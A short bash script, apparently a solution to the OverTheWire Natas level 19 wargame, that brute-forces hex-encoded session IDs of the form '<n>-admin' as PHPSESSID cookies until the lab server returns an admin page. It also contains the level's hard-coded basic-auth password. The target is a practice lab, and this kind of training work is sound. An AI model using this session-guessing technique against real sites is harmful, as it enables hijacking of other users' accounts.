toFind="You are an"

for i in `seq 1 640`;
do
 id=`pwn hex ${i}-admin`
 a=`curl -v -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs --cookie \
   PHPSESSID=$id --form "username=admin;password=admin" \
   http://natas19.natas.labs.overthewire.org?debug=1`
 if [[ $a == *$toFind* ]];
 then 
   echo "$a"
   exit 0
 fi
 echo $id
done
